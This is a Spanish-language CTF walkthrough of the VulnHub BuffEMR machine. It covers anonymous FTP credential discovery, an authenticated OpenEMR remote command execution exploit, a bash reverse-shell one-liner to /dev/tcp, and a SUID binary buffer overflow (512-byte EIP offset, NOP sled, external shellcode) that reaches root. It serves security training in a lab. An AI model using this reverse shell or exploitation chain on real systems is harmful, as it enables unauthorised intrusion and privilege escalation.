---
layout: default
title: BuffEMR CTF
parent: VulnHub
---
# BuffEMR
{: .no_toc }

## Contenidos
{: .no_toc .text-delta}

1. TOC
{:toc}

---

# Fase de reconocimientos

Si tiramos nuestro script base de reconocimiento, podremos observar lo siguiente:
![](/assets/img/VulnHub/BuffEMR/B0.png)

Tendremos los puertos:
- **SSH**{:.text-red-000}, perteneciente al puerto 22.
- **FTP**{:.text-red-000}, perteneciente al puerto 21.
- **HTTP**{:.text-red-000}, perteneciente a un servicio web, alojado en el puerto 80.

Si tiramos un script de reconocimiento para el puerto **FTP**, nos toparemos algo interesante:
![](/assets/img/VulnHub/BuffEMR/B1.png)

Encontramos que tenemos acceso **anonimo** al servicio fpt, por lo que veremos que podremos encontrar. Usaremos el comando
```bash
ftp anonymous@<IP>
```
Si vamos al directorio **/tests**{:.text-yellow-100}, nos toparemos con un archivo que contiene credenciales de acceso para el usuario **admin**.
![](/assets/img/VulnHub/BuffEMR/B2.png)

Si vemos, la pagina web que tiene por defecto es el mensaje de bienvenida por apache, por lo que nos queda aplicar **web fuzzing**{:.text-green-100}.
![](/assets/img/VulnHub/BuffEMR/B3.png)

Nos encontramos un login en la ruta, **/openemr**{:.text-red-100}. Por lo que introduciremos las credenciales que encontramos, encontrando la version:
![](/assets/img/VulnHub/BuffEMR/B4.png)
# Intrusion
Si buscamos por exploits, encontraremos uno que nos permite la **ejecucion remota de comandos** estando autenticados:
![](/assets/img/VulnHub/BuffEMR/B5.png)
![](/assets/img/VulnHub/BuffEMR/B6.png)

Podemos ver que tenemos ejecucion remota de comandos, por lo que nos queda ganar acceso al servidor.
```bash
bash -c "bash -i >&/dev/tcp/<IP>/PUERTO 0>&1"
```
![](/assets/img/VulnHub/BuffEMR/B7.png)

# Usuario Buffemr
Ahora bien, tendremos que hallar una forma de subir privilegios al usuario, si vamos a la ruta **/var**, encontraremos un archivo que dice **user.zip**, por lo que lo pasaremos a nuestra maquina, pero veremos que esta cifrado, por lo que nos toca encontrar una password... Esta la encontraremos en la ruta de obtenida del servicio **FTP**{:.text-yellow-100}, un archivo llamado **keys.sql**{:.text-red-000}.
![](/assets/img/VulnHub/BuffEMR/B8.png)

Ya tendremos las credenciales del usuario, por lo que entraremos por ssh.
![](/assets/img/VulnHub/BuffEMR/B9.png)

Si buscamos archivos que podremos ejecutar como SUID, encontraremos un archivo en la ruta **/opt**{:.text-red-100}.
![](/assets/img/VulnHub/BuffEMR/B10.png)

Por lo que nos queda traer este archivo a nuestra maquina, lo que podremos ver que es un ejecutable.
![](/assets/img/VulnHub/BuffEMR/B11.png)
![](/assets/img/VulnHub/BuffEMR/B12.png)
# BoF
Si lo ejecutamos, podremos ver que nos pide un argumento, por lo que si comenzamos a tratar de sobrecargarlo, veremos que en algun punto existe un error **SEGMENTATION FAULT**{:.text-red-100}. Por lo que se intentaremos un **BoF**{:.text-yellow-100}.
![](/assets/img/VulnHub/BuffEMR/B13.png)

Si usamos un debugger, podremos ver que se sobreescriben ciertas partes importantes de la memoria:
![](/assets/img/VulnHub/BuffEMR/B14.png)

Trataremos de crear un patron para luego filtrar por una cadena y dar con los bytes necesarios para toparnos con el **EIP**.

![](/assets/img/VulnHub/BuffEMR/B15.png)

Encontraremos que  los bytes necesarios para dar con el **EIP** son **512**{:.text-red-000}.

![](/assets/img/VulnHub/BuffEMR/B16.png)

Por lo que ahora buscaremos una shellcode, en este caso usare esta: [**SHELLCODE x86**](https://shell-storm.org/shellcode/files/shellcode-606.html){:.text-yellow-100}.

Por lo que nos queda restar los **512** bytes, con los 33 de nuestra shellcode. Para luego, buscar dentro del stack de la memoria.
> DATO IMPORTANTE, no olvidemos reemplazar las **A**, por **NOPs** -> "\x90".

![](/assets/img/VulnHub/BuffEMR/B17.png)

Si vemos, dentro de las direcciones del stack, podremos visualizar nuestros **NOps**{:.text-green-100}, por lo que solo nos quedaria buscar una direccion a donde apuntar el **EIP**{:.text-red-000}.

Por lo que si ejecutamos esta vez, podremos ver que nos ejecuta el comando **/bin/bash**.
![](/assets/img/VulnHub/BuffEMR/B18.png)

## Obteniendo el usuario ROOT

Por lo que podemos comprobar que hemos realizado un BoF de forma exitosa, solo nos queda ejecutarlo dentro del binario con SUID.
![](/assets/img/VulnHub/BuffEMR/B19.png)

# FIN
